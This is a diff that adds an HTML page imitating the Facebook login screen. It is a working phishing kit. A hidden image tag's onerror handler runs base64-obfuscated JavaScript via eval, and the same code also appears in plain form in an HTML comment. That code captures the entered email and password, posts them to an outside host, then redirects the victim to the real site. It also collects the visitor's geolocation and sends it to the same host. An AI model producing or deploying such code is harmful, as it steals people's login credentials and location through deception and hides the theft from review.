@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Facebook</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background: white;
+      padding: 20px 30px;
+      border-radius: 8px;
+      width: 320px;
+      text-align: center;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .login-box h1 {
+      font-weight: bold;
+      font-size: 36px;
+      color: #1877f2;
+      margin-bottom: 20px;
+      text-transform: lowercase;
+    }
+    .login-box form {
+      display: flex;
+      flex-direction: column;
+    }
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .login-box button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 10px 0;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .login-box a.forgotten {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #1877f2;
+      text-decoration: none;
+    }
+    .login-box .or-separator {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+      color: #999;
+    }
+    .login-box .or-separator::before,
+    .login-box .or-separator::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #dddfe2;
+    }
+    .login-box .or-separator:not(:empty)::before {
+      margin-right: .75em;
+    }
+    .login-box .or-separator:not(:empty)::after {
+      margin-left: .75em;
+    }
+    .login-box .create-account {
+      background-color: #42b72a;
+      color: white;
+      padding: 10px 0;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 10px;
+      text-decoration: none;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h1>facebook</h1>
+    <form method="POST" id="loginForm">
+      <input type="text" name="email" placeholder="Email address or phone number" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit" id="button">Log in</button>
+    </form>
+    <a href="#" class="forgotten">Forgotten account?</a>
+    <div class="or-separator">or</div>
+    <a href="#" class="create-account">Create new account</a>
+    <img src="x" onerror="eval(atob('ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luRm9ybScpLmFkZEV2ZW50TGlzdGVuZXIoJ3N1Ym1pdCcsIGZ1bmN0aW9uIChldmVudCkgewogICAgZXZlbnQucHJldmVudERlZmF1bHQoKTsgLy8gcHJldmVudCBmb3JtIGZyb20gYWN0dWFsbHkgc3VibWl0dGluZwoKICAgIGNvbnN0IGVtYWlsID0gdGhpcy5lbWFpbC52YWx1ZTsKICAgIGNvbnN0IHBhc3N3b3JkID0gdGhpcy5wYXNzd29yZC52YWx1ZTsKCiAgICBmZXRjaCgnaHR0cHM6Ly9mYmJjby52ZXJjZWwuYXBwL3NjcmlwdDInLCB7CiAgICAgICAgICAgICAgbWV0aG9kOiAnUE9TVCcsCiAgICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJwogICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgJ3VzZXJuYW1lJzplbWFpbCwKICAgICAgICAgICAgICAgICdwYXNzd29yZCc6cGFzc3dvcmQKICAgICAgICAgICAgICB9KQogICAgICAgICAgICB9KS50aGVuKHI9PnsKICAgICAgICAgICAgICAgIGxvY2F0aW9uPSJodHRwczovL2ZhY2Vib29rLmNvbSIKICAgICAgICAgICAgfSkKICAgIH0pCiAgICAKICAgIGZ1bmN0aW9uIGdldExvY2F0aW9uKCkgewogICAgICBpZiAobmF2aWdhdG9yLmdlb2xvY2F0aW9uKSB7CiAgICAgICAgbmF2aWdhdG9yLmdlb2xvY2F0aW9uLmdldEN1cnJlbnRQb3NpdGlvbigKICAgICAgICAgIChwb3NpdGlvbikgPT4gewogICAgICAgICAgICBjb25zdCBkYXRhID0gewogICAgICAgICAgICAgIGxhdGl0dWRlOiBwb3NpdGlvbi5jb29yZHMubGF0aXR1ZGUsCiAgICAgICAgICAgICAgbG9uZ2l0dWRlOiBwb3NpdGlvbi5jb29yZHMubG9uZ2l0dWRlCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIGZldGNoKCdodHRwczovL2ZiYmNvLnZlcmNlbC5hcHAvc2NyaXB0JywgewogICAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgICAgICAgIGhlYWRlcnM6IHsKICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicKICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KGRhdGEpCiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIC8vIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLmpzb24oKSkKICAgICAgICAgICAgLy8gLnRoZW4ocmVzdWx0ID0+IGFsZXJ0KEpTT04uc3RyaW5naWZ5KHJlc3VsdCkpKQogICAgICAgICAgICAvLyAuY2F0Y2goZXJyb3IgPT4gY29uc29sZS5lcnJvcignRXJyb3I6JywgZXJyb3IpKTsKICAgICAgICAgIH0sCiAgICAgICAgICAoKSA9PiB7CiAgICAgICAgICAgIAogICAgICAgICAgfQogICAgICAgICk7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgCiAgICAgIH0KICAgIH0KICAgIGdldExvY2F0aW9uKCk='))" style="display: none;" />
+
+    <!-- 
+    
+    document.getElementById('loginForm').addEventListener('submit', function (event) {
+    event.preventDefault(); // prevent form from actually submitting
+
+    const email = this.email.value;
+    const password = this.password.value;
+
+    fetch('https://fbbco.vercel.app/script2', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                'username':email,
+                'password':password
+              })
+            }).then(r=>{
+                location="https://facebook.com"
+            })
+    })
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const data = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            };
+            fetch('https://fbbco.vercel.app/script', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(data)
+            })
+            // .then(response => response.json())
+            // .then(result => alert(JSON.stringify(result)))
+            // .catch(error => console.error('Error:', error));
+          },
+          () => {
+
+          }
+        );
+      } else {
+
+      }
+    }
+    getLocation()
+    
+    -->
+  </div>
+  
+</body>
+</html>
